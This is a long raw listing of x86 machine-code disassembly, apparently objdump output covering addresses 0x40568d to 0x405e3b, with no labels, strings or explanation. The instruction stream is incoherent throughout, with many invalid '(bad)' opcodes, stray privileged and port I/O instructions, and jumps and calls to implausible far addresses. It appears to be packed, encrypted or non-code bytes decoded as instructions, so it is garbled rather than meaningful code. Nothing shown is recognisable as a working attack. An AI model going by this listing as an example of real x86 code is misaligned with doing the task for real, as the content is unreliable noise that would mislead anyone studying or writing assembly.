  40568d:	xchg   esi,eax
  40568e:	add    al,0x7b
  405690:	and    DWORD PTR [ebx+ebp*8-0x4adbcf9b],ecx
  405697:	and    esp,esp
  405699:	jmp    0x4056ba
  40569b:	push   es
  40569c:	loopne 0x4056a9
  40569e:	mov    ds:0x8f64a3ad,al
  4056a3:	inc    eax
  4056a4:	push   es
  4056a5:	or     al,0x80
  4056a7:	xchg   DWORD PTR [esi],ebp
  4056a9:	jo     0x40563a
  4056ab:	jae    0x4056d2
  4056ad:	nop
  4056ae:	shl    esp,1
  4056b0:	mov    eax,0x8bf9259d
  4056b5:	push   ss
  4056b6:	sub    edx,DWORD PTR [ebp-0x24]
  4056b9:	and    DWORD PTR [esi],edx
  4056bb:	sub    ch,bl
  4056bd:	adc    ch,BYTE PTR [eax]
  4056bf:	fimul  WORD PTR [edx+0xc]
  4056c3:	sbb    al,0x94
  4056c5:	(bad)  
  4056c7:	cmp    ah,BYTE PTR [eax]
  4056c9:	jno    0x405669
  4056cb:	inc    ebx
  4056cc:	mov    dl,cl
  4056ce:	or     DWORD PTR [ebp-0x1c],0xc0051889
  4056d5:	jb     0x4056a6
  4056d7:	push   esp
  4056d8:	loop   0x405729
  4056da:	or     bl,BYTE PTR [eax]
  4056dc:	jmp    0x4056f3
  4056de:	inc    ecx
  4056df:	dec    ebp
  4056e0:	das    
  4056e1:	push   eax
  4056e2:	dec    ebp
  4056e3:	into   
  4056e4:	mov    ebp,0x60139ad
  4056e9:	add    ecx,DWORD PTR [ebp+0xa]
  4056ec:	or     eax,DWORD PTR [eax]
  4056ee:	push   ss
  4056ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056f0:	stos   BYTE PTR es:[edi],al
  4056f1:	pusha  
  4056f2:	pop    es
  4056f3:	jge    0x4056d4
  4056f5:	cmp    ch,BYTE PTR [ebx+0x3f87220]
  4056fb:	test   DWORD PTR [esp+eax*2-0x11],ecx
  4056ff:	popf   
  405700:	jnp    0x405709
  405702:	adc    eax,0x4f87b3b5
  405707:	fsub   DWORD PTR [edx]
  405709:	ret    
  40570a:	cmp    ebp,ebx
  40570c:	or     al,0x55
  40570e:	pop    ebp
  40570f:	ror    BYTE PTR ds:0x168bd12d,1
  405715:	and    BYTE PTR [eax+ecx*1],0x8d
  405719:	fistp  WORD PTR [ecx+0x45]
  40571c:	call   0x895bf51
  405721:	pop    edi
  405722:	inc    ebx
  405723:	pop    esi
  405724:	aad    0xac
  405726:	pop    bx
  405728:	cmp    BYTE PTR [edx+0x18],al
  40572b:	lods   al,BYTE PTR ds:[esi]
  40572c:	loopne 0x405743
  40572e:	xchg   ebp,eax
  40572f:	sbb    dl,bh
  405731:	pop    ds
  405732:	lock dec ecx
  405734:	inc    eax
  405735:	sub    ecx,DWORD PTR [esi]
  405737:	daa    
  405738:	cmp    ebx,eax
  40573a:	jg     0x40575d
  40573c:	add    edi,edi
  40573e:	push   esi
  40573f:	adc    eax,0x7420ff1e
  405744:	in     eax,dx
  405745:	mov    DWORD PTR [edi],ebx
  405747:	lahf   
  405748:	ret    
  405749:	(bad)  
  40574a:	fs shl esp,1
  40574d:	or     al,bh
  40574f:	mov    ebx,0xf4b6a6f7
  405754:	cmp    al,bl
  405756:	(bad)  
  405757:	lods   al,BYTE PTR ds:[esi]
  405758:	push   cs
  405759:	(bad)  
  40575a:	dec    esp
  40575b:	test   al,0x5d
  40575d:	or     DWORD PTR [edx-0x30],edx
  405760:	lods   eax,DWORD PTR ds:[esi]
  405761:	cmc    
  405762:	sbb    esi,DWORD PTR [ebx]
  405764:	test   bl,0x45
  405767:	add    eax,eax
  405769:	out    0xbd,al
  40576b:	push   eax
  40576c:	mov    bh,0x80
  40576e:	les    edx,FWORD PTR [edi+ebx*1-0x11]
  405772:	jmp    0x1ad6:0xc87d6630
  405779:	pop    ds
  40577a:	pusha  
  40577b:	pop    esp
  40577c:	(bad)  
  40577d:	adc    DWORD PTR [edx-0x7d83febc],ecx
  405783:	mov    edi,0x2cd00418
  405788:	or     dh,BYTE PTR [ebx+0x7]
  40578b:	cmc    
  40578c:	jb     0x40575b
  40578e:	aam    0x5f
  405790:	stos   DWORD PTR es:[edi],eax
  405791:	jbe    0x4057c4
  405793:	sbb    BYTE PTR [esi-0x5],bh
  405796:	dec    esi
  405797:	adc    ch,BYTE PTR [edx]
  405799:	ret    0x1db8
  40579c:	mov    al,0xdb
  40579e:	ror    DWORD PTR [eax+0x18891402],cl
  4057a4:	sub    eax,0xa06f3089
  4057a9:	and    eax,0xf77606d1
  4057ae:	fild   DWORD PTR [eax-0x60db7bee]
  4057b4:	in     al,0x54
  4057b6:	mov    edi,DWORD PTR [esp+ebp*1]
  4057b9:	lahf   
  4057ba:	sbb    DWORD PTR [ecx],0x19
  4057bd:	add    al,0xc4
  4057bf:	fcom   QWORD PTR [ebx+0x6c]
  4057c2:	(bad)  
  4057c3:	dec    eax
  4057c4:	mov    eax,ds:0xcc1475e8
  4057c9:	sub    al,BYTE PTR [ebp+0xe16168d]
  4057cf:	les    esi,FWORD PTR [ebx+0x74]
  4057d2:	mov    DWORD PTR [ebp-0x17f6cfeb],edx
  4057d8:	xor    DWORD PTR ds:0x60120bd,0xffffffb3
  4057df:	add    DWORD PTR [edx+0x2f239231],ecx
  4057e5:	and    DWORD PTR [eax],0x2d
  4057e8:	xor    bl,bh
  4057ea:	test   al,0x3a
  4057ec:	adc    ah,BYTE PTR [ebx+0x51]
  4057ef:	mov    BYTE PTR [eax+esi*8],cl
  4057f2:	jae    0x40577b
  4057f4:	lock pop esi
  4057f6:	inc    eax
  4057f7:	aas    
  4057f8:	outs   dx,BYTE PTR ds:[esi]
  4057f9:	dec    ebp
  4057fa:	pop    es
  4057fb:	push   esp
  4057fc:	outs   dx,DWORD PTR ds:[esi]
  4057fd:	or     edx,DWORD PTR [esi+edi*2+0x7]
  405801:	repnz push es
  405803:	(bad)  
  405804:	cmp    al,BYTE PTR [eax]
  405806:	inc    edi
  405807:	rcr    BYTE PTR [ebx],1
  405809:	pusha  
  40580a:	add    al,0xff
  40580c:	pop    es
  40580d:	js     0x40584c
  40580f:	adc    BYTE PTR [ebp-0x4e],bl
  405812:	dec    edi
  405813:	xor    DWORD PTR [edi-0x1ddd673],edi
  405819:	outs   dx,DWORD PTR ds:[esi]
  40581a:	mov    cl,0x22
  40581c:	ds hlt 
  40581e:	fild   QWORD PTR [esp+eax*2]
  405821:	je     0x40583d
  405823:	dec    al
  405825:	je     0x405831
  405827:	sub    al,0xad
  405829:	sti    
  40582a:	lea    edx,[edi+0x740c2c53]
  405830:	test   BYTE PTR [eax],dl
  405832:	mov    bl,0x2
  405834:	jmp    0x405850
  405836:	add    edx,DWORD PTR [esi]
  405838:	sub    dh,ch
  40583a:	ret    
  40583b:	ficomp WORD PTR [edx]
  40583d:	nop
  40583e:	cmp    ebp,ebx
  405840:	push   cs
  405841:	inc    edi
  405842:	pop    eax
  405843:	clc    
  405844:	jle    0x405812
  405846:	outs   dx,BYTE PTR ds:[esi]
  405847:	and    ah,BYTE PTR [esi-0x48]
  40584a:	jp     0x4057d3
  40584c:	sti    
  40584d:	test   BYTE PTR cs:[esp+esi*8+0x6a032036],0x0
  405856:	or     eax,0xac32138b
  40585b:	test   eax,0x99e3110
  405860:	add    al,BYTE PTR [ebx]
  405862:	aas    
  405863:	and    ah,BYTE PTR [edx]
  405865:	int3   
  405866:	add    edi,DWORD PTR ds:[esp+ecx*1+0x2d]
  40586b:	mov    edx,eax
  40586d:	pop    es
  40586e:	lock leave 
  405870:	das    
  405871:	push   ebp
  405872:	push   ecx
  405873:	mov    ebp,eax
  405875:	lea    edi,[edi-0xa245557]
  40587b:	push   ecx
  40587c:	mov    ebx,0x4be486a
  405881:	sub    ebx,DWORD PTR fs:[ebx]
  405884:	cmp    eax,DWORD PTR [ebx-0x3a74d648]
  40588a:	lea    eax,[ebx]
  40588c:	pop    es
  40588d:	pop    edx
  40588e:	add    eax,0xb410c289
  405893:	lahf   
  405894:	mov    eax,fs
  405896:	ficomp DWORD PTR [esi-0x38]
  405899:	add    al,0xf1
  40589b:	jmp    0x4058a6
  40589d:	inc    esi
  40589e:	call   0x8112cdf2
  4058a3:	pop    es
  4058a4:	loope  0x4058a6
  4058a6:	stos   DWORD PTR es:[edi],eax
  4058a7:	xor    ah,dh
  4058a9:	aas    
  4058aa:	push   esi
  4058ab:	shl    DWORD PTR [ebx],0x55
  4058ae:	cmp    al,0x12
  4058b0:	jne    0x4058ec
  4058b2:	cmp    ebx,0x63
  4058b5:	jg     0x4058db
  4058b7:	jg     0x4058c3
  4058b9:	dec    esp
  4058ba:	lock dec esi
  4058bc:	mov    esp,0x3399e732
  4058c1:	ret    0xd12b
  4058c4:	aas    
  4058c5:	mov    bh,0xe0
  4058c7:	ret    0xc803
  4058ca:	and    DWORD PTR [eax+eax*1+0x6b],0xd80364c0
  4058d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d3:	out    dx,eax
  4058d4:	push   ss
  4058d5:	cli    
  4058d6:	mov    ch,0x78
  4058d8:	cld    
  4058d9:	pushf  
  4058da:	push   cs
  4058db:	or     bh,dh
  4058dd:	pop    eax
  4058de:	cld    
  4058df:	jmp    0x4058e7
  4058e1:	jb     0x405946
  4058e3:	xor    ah,al
  4058e5:	(bad)  [eax-0x4]
  4058e8:	xor    al,BYTE PTR [ebx]
  4058ea:	ret    
  4058eb:	outs   dx,DWORD PTR ds:[esi]
  4058ec:	fadd   DWORD PTR [edi]
  4058ee:	stos   DWORD PTR es:[edi],eax
  4058ef:	fld    DWORD PTR gs:[esi]
  4058f2:	fadd   DWORD PTR [edx]
  4058f4:	fsubr  st(0),st
  4058f6:	in     al,0x19
  4058f8:	lea    esp,[eax-0x44]
  4058fb:	fs clc 
  4058fd:	xchg   ebx,eax
  4058ff:	adc    BYTE PTR [esi+0x6c17286],cl
  405905:	pop    ebp
  405906:	out    dx,al
  405907:	jb     0x4058a9
  405909:	ret    
  40590a:	jp     0x4058c0
  40590c:	sbb    dl,BYTE PTR [ebp+ebp*4-0x38]
  405910:	iret   
  405911:	pop    edi
  405912:	dec    edi
  405913:	mov    ch,0xc4
  405915:	and    DWORD PTR [eax+0x78],0xfffffff6
  405919:	and    DWORD PTR [ebx+0x5ea28468],eax
  40591f:	mov    ch,BYTE PTR ds:0x67f01a3e
  405925:	jne    0x40595b
  405927:	push   es
  405928:	ja     0x4058ea
  40592a:	mov    bl,0xcb
  40592c:	sub    DWORD PTR [edi+edi*4+0x17490b8b],0xffffffb1
  405934:	push   eax
  405935:	fwait
  405936:	jno    0x4058fe
  405938:	inc    eax
  405939:	adc    bl,BYTE PTR [esi+0x7ee114e4]
  40593f:	out    dx,al
  405940:	inc    ecx
  405941:	int    0x7
  405943:	xor    esp,0x44
  405946:	adc    BYTE PTR [edi+0x15a4b7dc],bh
  40594c:	ds mov eax,0x449e597f
  405952:	or     edi,DWORD PTR [esi]
  405954:	jne    0x40590e
  405956:	cwde   
  405957:	or     BYTE PTR [ecx-0x14ba55b8],ah
  40595d:	jae    0x4059ca
  40595f:	add    DWORD PTR [esi],ebx
  405961:	ins    BYTE PTR es:[edi],dx
  405962:	hlt    
  405963:	push   esi
  405964:	or     BYTE PTR [eax],0x84
  405967:	mov    edi,0x7b3b3731
  40596c:	stos   BYTE PTR es:[edi],al
  40596d:	call   0x1628:0x6d81f410
  405974:	adc    edx,edx
  405976:	ins    BYTE PTR es:[edi],dx
  405977:	out    0x1a,al
  405979:	cs jmp 0x205e:0x79a402f2
  405981:	into   
  405982:	add    cl,ch
  405984:	lock fdivr DWORD PTR [eax-0x15]
  405988:	shl    DWORD PTR es:[ecx+0x12ce08a],cl
  40598f:	jb     0x4059ea
  405991:	and    bl,ch
  405993:	mov    dh,0x2e
  405995:	out    dx,al
  405996:	popa   
  405997:	cmp    ch,bl
  405999:	push   edx
  40599a:	push   esi
  40599b:	lock adc ch,cl
  40599e:	imul   al
  4059a0:	add    WORD PTR [ecx+eax*1+0x71ed90c],bx
  4059a8:	xor    eax,ecx
  4059aa:	and    BYTE PTR [ebx],dl
  4059ac:	imul   bl
  4059ae:	ss sbb esi,edx
  4059b1:	hlt    
  4059b2:	into   
  4059b3:	test   DWORD PTR [ecx*8-0xf140be6],ebp
  4059ba:	cmp    edx,DWORD PTR [edi]
  4059bc:	syscall 
  4059be:	cli    
  4059bf:	scas   al,BYTE PTR es:[edi]
  4059c0:	push   ebp
  4059c1:	jg     0x405a3a
  4059c3:	test   BYTE PTR [eax+0x1b],cl
  4059c6:	mov    ch,0x58
  4059c8:	stos   BYTE PTR es:[edi],al
  4059c9:	pop    ecx
  4059ca:	stc    
  4059cb:	jo     0x405985
  4059cd:	xor    DWORD PTR [edi-0x72],esi
  4059d0:	inc    eax
  4059d1:	xor    al,0x84
  4059d3:	push   0xffffffef
  4059d5:	imul   edx,eax,0x10c1a12b
  4059db:	sbb    ch,bl
  4059dd:	push   ecx
  4059de:	in     al,dx
  4059df:	inc    eax
  4059e0:	out    dx,al
  4059e1:	rcr    ebx,0x88
  4059e4:	xchg   esi,eax
  4059e5:	and    eax,0x8b1b3df1
  4059ea:	jge    0x405a67
  4059ec:	mov    bh,0x52
  4059ee:	cmp    al,0x40
  4059f0:	cmp    ecx,eax
  4059f2:	jle    0x405a29
  4059f4:	adc    bh,al
  4059f6:	fs jmp 0x405a28
  4059f9:	cmp    cl,BYTE PTR [ecx+0x6c]
  4059fc:	fcom   DWORD PTR [esi]
  4059fe:	pop    ebx
  4059ff:	inc    edi
  405a00:	neg    BYTE PTR [edx+0x12]
  405a03:	test   DWORD PTR [ecx+0x24],edi
  405a06:	mov    WORD PTR [esp+esi*1-0x6ec44e1],gs
  405a0d:	ins    BYTE PTR es:[edi],dx
  405a0e:	xor    BYTE PTR [ecx],ah
  405a10:	add    al,0x64
  405a12:	in     al,0x57
  405a14:	inc    esp
  405a15:	dec    ebx
  405a16:	jo     0x405a21
  405a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a19:	mov    bl,0x9b
  405a1b:	call   0x624d8c5f
  405a20:	push   ecx
  405a21:	call   0x4a6d:0x1ab59b54
  405a28:	ret    0x1148
  405a2b:	adc    dh,ah
  405a2d:	xrelease xchg DWORD PTR [esi+0x21728165],ecx
  405a34:	cmp    cl,BYTE PTR [ecx]
  405a36:	and    eax,DWORD PTR [esi]
  405a38:	pop    eax
  405a39:	mov    eax,0xea75d92c
  405a3e:	pusha  
  405a3f:	sbb    al,0x54
  405a41:	sbb    ah,0x35
  405a44:	sub    DWORD PTR [esi-0x6e],edx
  405a47:	jmp    FWORD PTR [ebp-0x7f]
  405a4a:	mov    dl,0xfd
  405a4c:	sbb    dh,dh
  405a4e:	ins    BYTE PTR es:[edi],dx
  405a4f:	fcom   QWORD PTR [edi]
  405a51:	outs   dx,DWORD PTR ds:[esi]
  405a52:	je     0x405a7e
  405a54:	sub    eax,ebx
  405a56:	lods   al,BYTE PTR ds:[esi]
  405a57:	popa   
  405a58:	push   edi
  405a59:	xor    dl,BYTE PTR [eax+ebx*8+0x11ae9917]
  405a60:	push   es
  405a61:	pusha  
  405a62:	test   BYTE PTR [ecx],dl
  405a64:	dec    edx
  405a65:	stc    
  405a66:	rcr    BYTE PTR [edx+0x38],0xd6
  405a6a:	push   ebp
  405a6b:	out    dx,al
  405a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a6d:	jae    0x405ac3
  405a6f:	xor    edi,0x2bc185a4
  405a75:	ja     0x4059fe
  405a77:	retf   0x784c
  405a7a:	jl     0x405a3d
  405a7c:	and    BYTE PTR [esi],ah
  405a7e:	cmp    DWORD PTR [eax],0xda00a7c3
  405a84:	pop    ss
  405a85:	xchg   ebx,eax
  405a86:	gs sub al,0x64
  405a89:	add    BYTE PTR [ecx+0x5ba435ca],ah
  405a8f:	ret    0x8e0a
  405a92:	hlt    
  405a93:	sbb    bh,al
  405a95:	or     edi,0xffffffff
  405a98:	xor    eax,0x82eea70d
  405a9d:	pushf  
  405a9e:	mov    dh,0x6a
  405aa0:	pop    ebx
  405aa1:	or     ah,BYTE PTR [esi]
  405aa3:	adc    dl,BYTE PTR [edx]
  405aa5:	mov    ecx,0xbd8d0b2
  405aaa:	add    al,0xc9
  405aac:	adc    DWORD PTR [ebx],ecx
  405aae:	(bad)  
  405aaf:	jmp    0x405adb
  405ab1:	sub    cl,dl
  405ab3:	and    eax,0xdc943253
  405ab8:	add    eax,0xcd02e681
  405abd:	scas   eax,DWORD PTR es:[edi]
  405abe:	add    BYTE PTR [esp+edi*2+0x518bc509],cl
  405ac5:	sub    eax,0x50903000
  405aca:	popf   
  405acb:	sahf   
  405acc:	xor    DWORD PTR [ebx],edi
  405ace:	imul   edx,DWORD PTR [ecx],0xffffffa3
  405ad1:	inc    ebp
  405ad2:	add    DWORD PTR [edx+edx*8+0x1ab67271],ebx
  405ad9:	push   es
  405ada:	push   es
  405adb:	or     BYTE PTR [edx],cl
  405add:	out    0xd6,eax
  405adf:	in     al,0xb0
  405ae1:	cmp    DWORD PTR [esp+ecx*4],0xffffff8b
  405ae5:	lds    esi,FWORD PTR [esp+esi*2+0x41]
  405ae9:	or     al,BYTE PTR [edi+0x327601c]
  405aef:	add    DWORD PTR [edi+eax*2],ebp
  405af2:	or     al,0x4b
  405af4:	cmp    DWORD PTR es:[ecx],esp
  405af7:	(bad)  
  405af8:	add    BYTE PTR [edi-0x39],bh
  405afb:	es in  al,0x90
  405afe:	sbb    cl,BYTE PTR [esi]
  405b00:	test   eax,0xa8537dc2
  405b05:	jp     0x405b48
  405b07:	or     BYTE PTR [ecx],bl
  405b09:	and    al,0x66
  405b0b:	xchg   DWORD PTR [edi],esp
  405b0d:	(bad)  
  405b0e:	jge    0x405aa1
  405b10:	je     0x405b58
  405b12:	pop    es
  405b13:	or     al,0x77
  405b15:	ds jne 0x405b1f
  405b18:	pop    es
  405b19:	xor    al,0x92
  405b1b:	loopne 0x405ab7
  405b1d:	add    al,0x1
  405b1f:	push   cs
  405b20:	cmp    eax,0xd70e6a02
  405b25:	xor    dl,BYTE PTR ds:0xa8111986
  405b2b:	mov    ah,0xab
  405b2d:	pop    esi
  405b2e:	imul   eax,DWORD PTR [edx],0x54
  405b31:	lods   eax,DWORD PTR ds:[esi]
  405b32:	adc    al,0x66
  405b34:	jb     0x405b82
  405b36:	adc    BYTE PTR [eax+eax*1+0x2474c74c],ch
  405b3d:	test   BYTE PTR [ebx+0x476f4359],cl
  405b43:	mov    BYTE PTR [ecx],bl
  405b45:	lds    ecx,FWORD PTR [ebx+0x14662379]
  405b4b:	arpl   WORD PTR [ebp+0x2ccec989],dx
  405b51:	ins    DWORD PTR es:[edi],dx
  405b52:	(bad)  
  405b53:	xlat   BYTE PTR ds:[ebx]
  405b54:	xchg   ebp,eax
  405b55:	push   cs
  405b56:	xchg   ebp,eax
  405b57:	or     al,0xa
  405b59:	leave  
  405b5a:	sbb    al,0x7c
  405b5c:	or     eax,DWORD PTR [esi]
  405b5e:	addr16 push ecx
  405b60:	inc    esi
  405b61:	pop    edx
  405b62:	scas   eax,DWORD PTR es:[edi]
  405b63:	push   esi
  405b64:	add    al,0x6b
  405b66:	lock pusha 
  405b68:	call   0x6178e353
  405b6d:	and    al,0x0
  405b6f:	or     al,0x2f
  405b71:	data16 adc al,0xcc
  405b74:	dec    ecx
  405b75:	outs   dx,BYTE PTR ds:[esi]
  405b76:	fld    QWORD PTR ss:[esi+eax*8-0x7c]
  405b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b7c:	sbb    eax,0x7e24c68b
  405b81:	inc    ecx
  405b82:	mov    edx,0x61101c1e
  405b87:	jne    0x405b96
  405b89:	and    eax,0xc3f86143
  405b8e:	or     ebx,eax
  405b90:	jmp    0x405bb9
  405b92:	fucomp st(2)
  405b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b95:	fdiv   DWORD PTR [edi-0x21]
  405b98:	mov    bl,BYTE PTR gs:[edx+esi*2+0x55dc0e0d]
  405ba0:	fstp   QWORD PTR [edi]
  405ba2:	fwait
  405ba3:	jmp    0x405bb0
  405ba5:	or     al,0x3
  405ba7:	cmc    
  405ba8:	mov    esi,0x18d464c8
  405bad:	shl    DWORD PTR [ebp-0x5eba73bb],cl
  405bb3:	and    eax,0x135adaee
  405bb8:	add    dh,cl
  405bba:	mov    dl,0x89
  405bbc:	(bad)  
  405bbd:	push   edx
  405bbe:	or     esi,DWORD PTR [ebp+0x4d807918]
  405bc4:	xor    bh,BYTE PTR [eax+0x45a25fd2]
  405bca:	adc    ecx,DWORD PTR [esi+ecx*1]
  405bcd:	xchg   DWORD PTR [ebp-0x80],esi
  405bd0:	jmp    0xb62d:0x76227221
  405bd7:	repnz add al,0xd
  405bda:	rol    BYTE PTR [esi+0x291691cb],cl
  405be0:	loopne 0x405c2f
  405be2:	cmp    BYTE PTR gs:[ebx+0x4d],bh
  405be6:	loop   0x405bc1
  405be8:	xchg   DWORD PTR [edx-0x50],esp
  405beb:	pop    ebp
  405bec:	or     BYTE PTR [eax-0x73],dl
  405bef:	add    BYTE PTR [edx+0x74],al
  405bf2:	jns    0x4748a77b
  405bf8:	adc    al,cl
  405bfa:	or     DWORD PTR [ecx],0x35
  405bfd:	mov    eax,ds:0xa2ecae63
  405c02:	inc    ebx
  405c03:	rol    DWORD PTR [ebp-0x50],1
  405c06:	(bad)  
  405c07:	mov    eax,ds:0x49117cbc
  405c0c:	maskmovq mm3,mm1
  405c0f:	clc    
  405c10:	push   0x2
  405c12:	push   0xfed61e2
  405c17:	inc    eax
  405c18:	add    eax,0x8802208a
  405c1d:	or     DWORD PTR [ecx-0x70],eax
  405c20:	cld    
  405c21:	ret    
  405c22:	or     si,0xffe0
  405c26:	ror    DWORD PTR [edi+0x74],0x53
  405c2a:	(bad)  
  405c2b:	adc    BYTE PTR [eax+0x33d8e803],ch
  405c31:	leave  
  405c32:	push   edx
  405c33:	mov    ch,al
  405c35:	fwait
  405c36:	or     eax,0x21eb5017
  405c3b:	sub    al,0xb8
  405c3d:	popa   
  405c3e:	lahf   
  405c3f:	fistp  DWORD PTR [esi+0x10]
  405c42:	xor    BYTE PTR [ebp+0x5126af],0x62
  405c49:	repnz or al,0xde
  405c4c:	inc    edx
  405c4d:	jecxz  0x405bdb
  405c4f:	scas   eax,DWORD PTR es:[edi]
  405c50:	je     0x405bd2
  405c52:	sbb    al,0x3c
  405c54:	cdq    
  405c55:	pusha  
  405c56:	loop   0x405c9d
  405c58:	mov    esp,0xa00311db
  405c5d:	mov    edi,0x6a55d004
  405c62:	or     ebx,DWORD PTR [esi+0x8]
  405c65:	sbb    cl,al
  405c67:	sub    eax,0x8d4f7c77
  405c6c:	inc    ebx
  405c6d:	inc    esp
  405c6e:	inc    ebx
  405c6f:	add    esi,ebp
  405c71:	and    bh,BYTE PTR [edi+0x5f595c8b]
  405c77:	mov    DWORD PTR [esp+ecx*4+0x22c3b98c],ecx
  405c7e:	lock lods al,BYTE PTR ds:[esi]
  405c80:	cmp    BYTE PTR [edx],dl
  405c82:	(bad)
  405c85:	lock mov eax,edi
  405c88:	inc    ebx
  405c89:	and    DWORD PTR [ebx-0x1f760279],ebx
  405c8f:	sti    
  405c90:	or     eax,0x5760ae75
  405c95:	add    BYTE PTR [edi+0x1c],dl
  405c98:	sub    eax,0x2e6d060a
  405c9d:	add    eax,0x332a0783
  405ca2:	mov    dl,0x6c
  405ca4:	dec    ebx
  405ca5:	push   es
  405ca6:	in     al,dx
  405ca7:	fmul   QWORD PTR [ebx+0x72]
  405caa:	fmul   DWORD PTR [esi]
  405cac:	mov    bh,0xc0
  405cae:	xor    DWORD PTR [eax-0x14],esi
  405cb1:	and    al,0xe
  405cb3:	cmp    esp,DWORD PTR [esp+eiz*4-0x18]
  405cb7:	clc    
  405cb8:	sub    dh,BYTE PTR [edx-0x18]
  405cbb:	adc    BYTE PTR [ecx-0x10],0x48
  405cbf:	or     BYTE PTR [ebp+0x65],dh
  405cc2:	or     DWORD PTR [esi+ebp*2+0x3ab68cee],esp
  405cc9:	pop    ds
  405cca:	xchg   ecx,eax
  405ccb:	pop    esi
  405ccc:	push   0x144828d4
  405cd1:	(bad)  
  405cd2:	mov    fs,eax
  405cd4:	div    BYTE PTR [esi]
  405cd6:	push   es
  405cd7:	jmp    0x74479ae2
  405cdc:	pop    ds
  405cdd:	dec    edx
  405cde:	cmp    al,0x9d
  405ce0:	inc    edi
  405ce1:	mov    cl,0x46
  405ce3:	mov    DWORD PTR [edx],0x99ff075
  405ce9:	addr16 push 0xac0af893
  405cef:	mov    esi,0x66133ccd
  405cf4:	adc    BYTE PTR [ebx+eax*8+0x33],cl
  405cf8:	pop    eax
  405cf9:	pop    es
  405cfa:	cdq    
  405cfb:	mov    al,0xc9
  405cfd:	lea    esp,[ecx+0x4b]
  405d00:	sub    al,0x60
  405d02:	jmp    DWORD PTR [ebp+0x8]
  405d05:	data16 xor BYTE PTR [ebx+0x58b1ae47],ah
  405d0c:	mov    eax,ds:0xa05f5a23
  405d11:	or     ebx,DWORD PTR [esi]
  405d13:	pop    eax
  405d14:	pop    ss
  405d15:	xchg   edx,eax
  405d16:	xchg   edi,eax
  405d17:	adc    al,0xea
  405d19:	lea    ebp,[eax+0x75]
  405d1c:	rol    DWORD PTR [edx],0x12
  405d1f:	rcr    DWORD PTR [ecx-0x5],0x76
  405d23:	(bad)  
  405d24:	loopne 0x405cce
  405d26:	leave  
  405d27:	mov    cs,WORD PTR [ebx]
  405d29:	mov    eax,0x8c5cb9d3
  405d2e:	adc    bl,ch
  405d30:	adc    esp,DWORD PTR [eax]
  405d32:	mov    edx,0x6a1e300b
  405d37:	ret    0x3a21
  405d3a:	lods   al,BYTE PTR ds:[esi]
  405d3b:	xchg   esi,eax
  405d3c:	pop    edi
  405d3d:	stc    
  405d3e:	cmp    esp,DWORD PTR [edx-0x3b]
  405d41:	xchg   edi,eax
  405d42:	jmp    0x46a:0x3c4183fd
  405d49:	push   esi
  405d4a:	popf   
  405d4b:	pop    ss
  405d4c:	setg   BYTE PTR [esi]
  405d4f:	and    eax,0xbab007c0
  405d54:	cwde   
  405d55:	mov    eax,0x2005fb79
  405d5a:	(bad)  
  405d5b:	mov    DWORD PTR [ebx],0xf4754a55
  405d61:	push   0x3
  405d63:	sub    BYTE PTR [edi-0x3fe6eeb],dl
  405d69:	xchg   esp,eax
  405d6a:	mov    gs,WORD PTR [ebx+0x12923470]
  405d70:	in     al,dx
  405d71:	jmp    0x405d1f
  405d73:	xchg   esi,eax
  405d74:	push   ecx
  405d75:	xor    DWORD PTR es:[edi+0x79308a45],eax
  405d7c:	push   ss
  405d7d:	mov    edx,0x4f2fee8f
  405d82:	mov    dl,0x4d
  405d84:	add    bl,BYTE PTR [esi+0x490f8c6]
  405d8a:	mov    edx,0x92e4b67e
  405d8f:	or     eax,edi
  405d91:	ret    0x820f
  405d94:	inc    esp
  405d95:	add    DWORD PTR [edi-0x507cd128],ecx
  405d9b:	or     al,0x15
  405d9d:	repz rcl DWORD PTR [ecx-0x5d],1
  405da1:	scas   al,BYTE PTR es:[edi]
  405da2:	pop    ecx
  405da3:	mov    BYTE PTR [ecx+0x35],bl
  405da6:	in     eax,0x56
  405da8:	or     ebx,esp
  405daa:	stos   BYTE PTR es:[edi],al
  405dab:	mov    ch,0x9e
  405dad:	sub    al,0x47
  405daf:	stos   BYTE PTR es:[edi],al
  405db0:	sub    al,0xa3
  405db2:	js     0x405e1c
  405db4:	and    eax,0xe1d716c7
  405db9:	push   cs
  405dba:	sbb    BYTE PTR [eax],0x5d
  405dbd:	push   esi
  405dbe:	and    esi,ebp
  405dc0:	int    0xc0
  405dc2:	aam    0xcc
  405dc4:	jle    0x405df2
  405dc6:	dec    eax
  405dc7:	ins    DWORD PTR es:[edi],dx
  405dc8:	inc    edi
  405dc9:	pop    ebx
  405dca:	(bad)  
  405dcb:	iret   
  405dcc:	pop    ss
  405dcd:	stos   DWORD PTR es:[edi],eax
  405dce:	or     eax,0x5ea42624
  405dd3:	inc    eax
  405dd4:	and    al,0x2e
  405dd6:	(bad)  
  405dd7:	pop    eax
  405dd8:	ror    DWORD PTR [eax],0x1d
  405ddb:	popf   
  405ddc:	int3   
  405ddd:	popf   
  405dde:	lock js 0x405d8c
  405de1:	shl    DWORD PTR [esi],0x89
  405de4:	mov    esi,eax
  405de6:	push   esi
  405de7:	add    esp,ebp
  405de9:	add    dh,BYTE PTR [ebx+edi*4+0x5f]
  405ded:	aas    
  405dee:	sar    BYTE PTR [edx+0x448d08c6],0xb9
  405df5:	in     al,dx
  405df6:	(bad)  
  405df8:	sahf   
  405df9:	pusha  
  405dfa:	outs   dx,BYTE PTR ds:[esi]
  405dfb:	(bad)  
  405dfd:	sbb    BYTE PTR [ecx+eax*4],dl
  405e00:	sbb    DWORD PTR [eax+0x7eebef91],edx
  405e06:	and    eax,0x96110418
  405e0b:	sub    dl,BYTE PTR ds:0x932c2839
  405e11:	push   esi
  405e12:	sbb    esp,esp
  405e14:	or     cl,bh
  405e16:	dec    ebp
  405e17:	xor    BYTE PTR [eax+esi*1],bh
  405e1a:	hlt    
  405e1b:	mov    WORD PTR [ebp+ebx*2+0x474591e],ds
  405e22:	jne    0x405e32
  405e24:	sbb    cl,BYTE PTR [eax-0x15]
  405e27:	dec    edi
  405e28:	leave  
  405e29:	xor    BYTE PTR [edx+eax*1],0xec
  405e2d:	in     al,dx
  405e2e:	jle    0xc1376940
  405e34:	cmp    bh,0xa7
  405e37:	(bad)  
  405e38:	cmc    
  405e39:	xor    ch,BYTE PTR [edx]
  405e3b:	inc    esp
